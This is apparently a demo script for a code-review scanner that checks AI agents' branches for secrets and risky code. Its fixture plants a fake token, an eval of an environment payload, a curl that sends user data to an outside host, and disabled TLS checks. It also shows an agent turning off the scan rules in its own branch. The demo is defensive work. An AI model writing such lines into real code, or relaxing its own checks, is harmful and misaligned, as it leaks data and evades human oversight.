#!/usr/bin/env node
/**
 * Phase 3, session 2 — the scan, shown rather than described.
 *
 * Four scenes against a real temporary repository and the real `secretlint`.
 * Scaffolding for one review: it goes when `sober review` renders this itself.
 *
 *   pnpm demo:scan
 */
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { addWorktree, initBoard, scanNode, setSetting, writeNode } from '@besober/core'

const NODE = 'auth-api-k7f2'
/** Assembled rather than written out: a literal here is a finding in SOBER's own CI. */
const TOKEN = ['ghp', '16C7e42F292c6912E7710c838347Ae178B4a'].join('_')
const root = mkdtempSync(join(tmpdir(), 'sober-demo-'))
const dir = join(root, 'acme')

const scene = (title) =>
	console.log(`\n\n\x1b[1m── ${title} ${'─'.repeat(Math.max(0, 60 - title.length))}\x1b[0m\n`)
const note = (text) => console.log(`\x1b[2m${text}\x1b[0m`)

const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim()

const board = async ({ declared = ['src/auth/**'], rc, extra } = {}) => {
	rmSync(dir, { recursive: true, force: true })
	execFileSync('git', ['init', '--initial-branch=main', dir], { stdio: 'ignore' })
	git('config', 'user.name', 'Demo')
	git('config', 'user.email', 'demo@besober.dev')
	writeFileSync(join(dir, 'README.md'), '# acme\n')
	git('add', 'README.md')
	git('commit', '-m', 'chore: first')

	const { paths } = await initBoard(dir, { title: 'Acme', intent: 'Ship it', constraints: [] })
	if (extra) {
		const config = setSetting(readFileSync(paths.config, 'utf8'), ['scan', 'extra'], extra)
		writeFileSync(paths.config, config)
	}
	await writeNode(paths, NODE, {
		title: 'The auth API',
		description: 'Sign in and sign out.',
		notes: '',
		dependsOn: [],
		decisions: [],
		files: declared,
		brief: null,
		outcome: null,
		accepted: null,
		createdAt: new Date().toISOString(),
	})
	if (rc) writeFileSync(join(dir, '.secretlintrc.json'), rc)
	git('add', '-A')
	git('commit', '-m', 'chore: sober')
	return paths
}

const work = async (paths, files) => {
	const { path } = await addWorktree(paths, NODE, 'main')
	for (const [name, contents] of Object.entries(files)) {
		mkdirSync(dirname(join(path, name)), { recursive: true })
		writeFileSync(join(path, name), contents)
	}
	execFileSync('git', ['add', '-A'], { cwd: path })
	execFileSync('git', ['commit', '-m', 'feat: the agent worked'], { cwd: path })
	return path
}

/** What the review screen shows above the diff (§6.2), in a terminal. */
const panel = (report) => {
	const head = {
		clean: '\x1b[32mclean\x1b[0m',
		findings: '\x1b[33mfindings\x1b[0m',
		'did-not-run': '\x1b[31mthe scan did not run\x1b[0m',
	}
	console.log(
		`  ${head[report.result]}   ·   rules: ${report.ruleSet}   ·   ${report.files.length} file(s) changed\n`,
	)
	for (const missing of report.didNotRun) console.log(`    \x1b[31m!\x1b[0m  ${missing}`)
	for (const finding of report.findings)
		console.log(
			`    ${finding.signal.padEnd(19)} ${`${finding.file}${finding.line === null ? '' : `:${finding.line}`}`.padEnd(28)} ${finding.message}`,
		)
	if (report.findings.length === 0 && report.didNotRun.length === 0)
		console.log('    nothing to look at')
}

try {
	// ── 1 ────────────────────────────────────────────────────────────────────
	scene('1. A node whose work is what it said it would be')
	const clean = await board()
	await work(clean, { 'src/auth/token.ts': 'export const sign = () => "ok"\n' })
	panel(await scanNode(clean, NODE, { base: 'main' }))
	note('\n  Nothing auto-rejects and nothing is hidden — this is a panel, not a gate.')

	// ── 2 ────────────────────────────────────────────────────────────────────
	scene('2. The same node, after an agent that went wandering')
	const dirty = await board()
	await work(dirty, {
		'package.json': '{ "dependencies": { "left-pad": "^1.0.0" } }\n',
		'src/billing/charge.ts': 'export const charge = () => 0\n',
		'src/auth/token.ts': [
			`const token = "${TOKEN}"`,
			'eval(process.env.PAYLOAD)',
			// biome-ignore lint/suspicious/noTemplateCurlyInString: the placeholder is the fixture
			'execSync(`curl -k https://collector.acme-metrics.io/v1?u=' + '${user}`)',
			'const agent = new Agent({ rejectUnauthorized: false })',
			'',
		].join('\n'),
	})
	panel(await scanNode(dirty, NODE, { base: 'main' }))
	note('\n  The key is masked: a panel that reprints a secret has published it again.')
	note('  Line numbers are the ones in the file, not in the diff.')

	// ── 3 ────────────────────────────────────────────────────────────────────
	scene('3. The rules come from the base, never from the branch under review')
	const relaxed = await board({ rc: '{\n\t"rules": []\n}\n' })
	await work(relaxed, {
		'src/auth/token.ts': `const token = "${TOKEN}"\n`,
	})
	note('  the base carries .secretlintrc.json with an empty rule set — a human merged that')
	panel(await scanNode(relaxed, NODE, { base: 'main' }))

	const strict = await board()
	const branch = await work(strict, {
		'src/auth/token.ts': `const token = "${TOKEN}"\n`,
	})
	writeFileSync(join(branch, '.secretlintrc.json'), '{ "rules": [] }')
	execFileSync('git', ['add', '-A'], { cwd: branch })
	execFileSync('git', ['commit', '-m', 'chore: relax the rules'], { cwd: branch })
	console.log('')
	note('  now the agent turns the rules off in its own branch instead')
	panel(await scanNode(strict, NODE, { base: 'main' }))
	note('\n  The relaxation is a diff line a human reads first, and applies only once accepted.')

	// ── 4 ────────────────────────────────────────────────────────────────────
	scene('4. A scanner that could not run is not a clean scan')
	const broken = await board({ extra: ['gitleaks detect --no-banner'] })
	await work(broken, { 'src/auth/token.ts': 'export const sign = () => "ok"\n' })
	note('  config.jsonc asks for gitleaks beside secretlint, and it is not installed here')
	panel(await scanNode(broken, NODE, { base: 'main' }))
	note('\n  The result is `did-not-run`, and that goes into the accepted record.')

	console.log('\n')
} finally {
	rmSync(root, { recursive: true, force: true })
}
